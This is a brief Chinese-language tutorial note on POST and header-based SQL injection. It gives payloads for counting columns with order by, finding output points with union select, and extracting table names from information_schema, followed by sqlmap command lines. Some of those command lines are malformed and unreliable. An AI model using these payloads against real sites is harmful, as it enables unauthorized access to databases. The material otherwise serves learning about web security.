# POST 和 HEAD 注入

工具：

* sqlmap ：跑sql注入的漏洞
* suite ：对数据包的操作

POST和HEAD注入本质：sql注入漏洞 

GET和POST：传参方式

GET：会经过URL编码

注入攻击的定义：把用户输入的数据当作sql语句执行

POST和普通的注入没有区别，只是根据传参方式的不同来分类

传参方式分类：POST HEAD COOKIE 

POST 注入：

1，order by检测数量 a' order by 1 #

2，联合查询，检测输出点 a' union select 1,2,3 #

3，拿数据 a' union select 1,table_name,3 from information_schema.tables where table_schema=database() #



#### sqlmap Post 注入攻击方式

直接跑数据跑不出，解决方案：

1，在URL后面写一个--form:sqlmap -u www.a.com--form

`form 表单

from 从。。。中

2，在URL面写一个-r 如（kali linux2020）

sqlmap -u www.a.com -r